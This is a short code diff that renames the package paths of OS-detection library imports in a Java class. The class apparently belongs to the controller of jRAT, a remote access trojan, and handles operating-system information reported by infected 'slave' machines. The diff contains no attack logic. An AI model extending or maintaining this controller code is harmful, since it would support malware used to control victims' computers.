@@ -1,22 +1,22 @@
 package io.jrat.controller.packets.incoming;
 
-import com.redpois0n.oslib.AbstractOperatingSystem;
-import com.redpois0n.oslib.Arch;
-import com.redpois0n.oslib.DesktopEnvironment;
-import com.redpois0n.oslib.OperatingSystem;
-import com.redpois0n.oslib.UnixOperatingSystem;
-import com.redpois0n.oslib.UnknownOperatingSystem;
-import com.redpois0n.oslib.bsd.BSDOperatingSystem;
-import com.redpois0n.oslib.bsd.Flavor;
-import com.redpois0n.oslib.linux.Distro;
-import com.redpois0n.oslib.linux.DistroSpec;
-import com.redpois0n.oslib.linux.LinuxOperatingSystem;
-import com.redpois0n.oslib.osx.OSXOperatingSystem;
-import com.redpois0n.oslib.osx.OSXVersion;
-import com.redpois0n.oslib.solaris.SolarisOperatingSystem;
-import com.redpois0n.oslib.windows.WindowsOperatingSystem;
 import io.jrat.controller.Slave;
 import java.io.DataInputStream;
+import oslib.AbstractOperatingSystem;
+import oslib.Arch;
+import oslib.DesktopEnvironment;
+import oslib.OperatingSystem;
+import oslib.UnixOperatingSystem;
+import oslib.UnknownOperatingSystem;
+import oslib.bsd.BSDOperatingSystem;
+import oslib.bsd.Flavor;
+import oslib.linux.Distro;
+import oslib.linux.DistroSpec;
+import oslib.linux.LinuxOperatingSystem;
+import oslib.osx.OSXOperatingSystem;
+import oslib.osx.OSXVersion;
+import oslib.solaris.SolarisOperatingSystem;
+import oslib.windows.WindowsOperatingSystem;
 
 public class Packet4InitOperatingSystem extends AbstractIncomingPacket {
 
